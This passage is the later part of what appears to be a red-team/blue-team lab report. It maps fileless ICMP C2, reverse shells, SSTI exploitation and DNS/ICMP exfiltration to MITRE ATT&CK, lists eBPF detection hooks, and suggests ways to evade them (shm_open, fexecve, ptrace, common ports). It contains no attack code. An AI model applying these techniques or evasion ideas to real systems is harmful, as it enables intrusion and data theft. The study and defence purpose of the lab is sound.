| 6 | Blue | eBPF v2 deployed (`blue_ebpf_mdr_v2.py --kill`) | Reverse shell detected via `connect` + `dup2/dup3` |
| 7 | Blue | SOC dashboard (`soc_dashboard.py`) | Unified visibility across all events |

The takeaway is that no single defense is sufficient. Security is a continuous adversarial process -- you deploy something, the attacker finds a way around it, and you have to adapt.

---

## 7. MITRE ATT&CK Mapping

### 7.1 Red Team Attack Techniques

| ID | Technique | Implementation |
|----|-----------|---------------|
| T1595 | Active Scanning | nmap port and service scanning via `recon.sh` |
| T1190 | Exploit Public-Facing Application | SSTI injection into Flask `/diag` endpoint |
| T1059.006 | Command & Scripting: Python | memfd loader, agent, reverse shell, exfil agent |
| T1620 | Reflective Code Loading | `memfd_create` → `execve` from `/proc/pid/fd` |
| T1027 | Obfuscated Files or Information | Double Base64 + AES-256-CTR encryption |
| T1140 | Deobfuscate/Decode | `base64 -d` pipeline in shell |
| T1095 | Non-Application Layer Protocol | ICMP covert C2 + TCP reverse shell (raw TCP) |
| T1571 | Non-Standard Port | C2 and reverse shell on port 4444 |
| T1048.003 | Exfiltration Over Alternative Protocol | DNS/ICMP data exfiltration |
| T1005 | Data from Local System | Exfil agent collects passwd, SSH keys, history |
| T1053.003 | Scheduled Task/Job: Cron | Crontab persistence (post_exploit.sh) |
| T1082 | System Information Discovery | whoami, uname, id via C2 shell |
| T1070.003 | Clear Command History | `history -c` during cleanup |
| T1070.004 | File Deletion | Exfil agent self-deletes after completion |

### 7.2 Blue Team Detection Coverage

| ID | Detection Surface | Hook/Mechanism | Version |
|----|-------------------|---------------|---------|
| T1620 | Reflective Code Loading | `sys_enter_memfd_create` tracepoint | v1 |
| T1059 | Execution from `/proc/fd` | `sys_enter_execve` filename pattern match | v1 |
| T1095 | Raw ICMP Socket | `sys_enter_socket(AF_INET, SOCK_RAW, ICMP)` | v1 |
| T1070 | Indicator Removal | `/proc/*/exe` cold-start scan for memfd processes | v1 |
| T1571 | Non-Standard Port Connect | `sys_enter_connect` port check | v2 |
| T1059.006 | Reverse Shell fd Hijack | `sys_enter_dup2/dup3` bitmask tracking | v2 |
| T1595 | Active Scanning | Honeypot trap on port 2222 | Network |
| -- | Known-Bad IP Blocking | `iptables -I INPUT 1 -s IP -j DROP` | Network |

---

## 8. Security Considerations and Limitations

The AES-256-CTR encryption with per-packet random IV provides strong confidentiality, but there are caveats. The shared secret is hardcoded in both the C2 server and the embedded agent code. Key derivation uses a single SHA-256 hash with no stretching (PBKDF2/Argon2 would be better). There's also no authentication -- AES-CTR is malleable, and a production system would need AES-GCM or ChaCha20-Poly1305. For the purposes of this lab, the encryption is strong enough to show that payload inspection is futile and behavior-based detection is the way to go.

The ICMP channel has very limited bandwidth: roughly 480 bytes per packet, and with jitter delays of 1.0--2.5 seconds per loop, throughput is extremely low. It's fine for command/control but not for moving large amounts of data. That's why exfiltration is handled separately through the DNS/ICMP channels with their own chunking protocols.

There are several ways the eBPF detection could potentially be bypassed. An attacker could use `shm_open()` instead of `memfd_create` to create shared memory objects, or `fexecve()` instead of `execve` with a `/proc` path to execute directly from an fd. `ptrace` injection into existing processes wouldn't trigger any of the current hooks either. For port-based detection, using port 80 or 443 for a reverse shell would bypass Hook 4, though Hook 5/6 would still catch the dup2 pattern. Possible mitigations include adding more hook points, combining with seccomp-BPF, or deploying a full endpoint detection solution.

The honeypot has its own limitations. It's low-interaction (only mimics the SSH banner, doesn't accept authentication), so a sophisticated attacker might recognize it during fingerprinting. It also only detects active connections -- passive recon like a SYN scan without a full connect might not trigger logging.

Finally, this is a lab environment with some simplifying assumptions. Flask runs as root (giving `CAP_NET_RAW` for ICMP), but in production, web services run as low-privilege users and raw ICMP sockets would need additional privilege escalation. eBPF detection should be part of a layered defense (EDR, SIEM, network monitoring), not standalone. And the SOC dashboard is single-machine, whereas production SOC systems aggregate data from hundreds of endpoints.

---

## 9. Conclusion

This project walks through a complete Kill Chain attack-defense cycle across 7 rounds, covering 15 MITRE ATT&CK techniques with detection capabilities across two independent defense layers.

A few things stand out from the exercise:

No single defense held up on its own. The honeypot and iptables got bypassed by IP aliasing. eBPF v1 got bypassed by the TCP reverse shell using different syscalls. You need multiple independent detection mechanisms working together.

The attacker-defender cycle is real and ongoing. When eBPF v1 blocked the fileless C2, the red team just switched to a reverse shell that dodged all the monitored syscalls. The blue team had to respond with v2, adding hooks for `connect()` and `dup2()/dup3()`. This is basically how real security operations work -- it's never "deploy and done."

Behavior-based detection holds up where payload inspection doesn't. Upgrading from XOR to AES-256-CTR made the traffic opaque to any content-based analysis, but eBPF still caught everything because it watches syscall patterns, not packet contents. This is an important point for why kernel-level monitoring matters.

The fileless execution via `memfd_create` is a good example of why traditional AV approaches struggle with modern techniques. There are no filesystem artifacts to scan. You need something like eBPF that operates at the kernel level to see what processes are actually doing.

Having the SOC dashboard tying everything together also turned out to matter more than I expected. Without unified visibility across the honeypot, network MDR, and both eBPF versions, you're just looking at isolated alerts without the full picture of what's happening.

---

## 10. Complete Tool Inventory

### Red Team

| Tool | File | Purpose | Requires sudo |
|------|------|---------|--------------|
| Fileless ICMP C2 | `red_team/red_attacker.py` | SSTI → memfd_create → AES-256-CTR ICMP C2 | Yes (raw ICMP) |
| TCP Reverse Shell | `red_team/red_reverse_shell.py` | eBPF v1 bypass via standard TCP + dup2 + pty | No |
| WAF Bypass | `red_team/exploit.py` | Legacy WAF bypass (Base64 + `${IFS}`) | No |
| Exfil Agent | `red_team/exfil_agent.py` | Target-side DNS/ICMP data exfiltration | No |
| Exfil Listener | `red_team/exfil_listener.py` | Attacker-side data reassembly server | Yes (DNS port 53, raw ICMP) |
| Recon Script | `red_team/recon.sh` | Automated nmap scanning | Depends on scan type |
| IP Switch | `red_team/ip_switch.sh` | IP alias management for MDR bypass | Yes (ip addr) |
| Deploy Agent | `red_team/deploy_agent.sh` | Base64-encoded exfil agent deployment | No |
| Post-Exploit | `red_team/post_exploit.sh` | Post-exploitation enumeration and persistence | No |

### Blue Team

| Tool | File | Purpose | Requires sudo |
|------|------|---------|--------------|
| eBPF MDR v1 | `blue_team/blue_ebpf_mdr.py` | 3 hooks: memfd_create, execve, socket | Yes (eBPF) |
| eBPF MDR v2 | `blue_team/blue_ebpf_mdr_v2.py` | 6 hooks: + connect, dup2, dup3 | Yes (eBPF) |
| Network MDR | `blue_team/blue_mdr_network.py` | Honeypot trap monitor + iptables auto-block | Yes (iptables) |
| SOC Dashboard | `blue_team/soc_dashboard.py` | Real-time web UI aggregating all events | No |

### Target

| Tool | File | Purpose | Requires sudo |
|------|------|---------|--------------|
| Vulnerable API | `target/target_app.py` | Flask SSTI vulnerable diagnostic service (port 9999) | Recommended (low ports) |
| SSH Honeypot | `target/honeypot.py` | Fake SSH on port 2222, logs attacker IPs to trap.log | Recommended (low ports) |
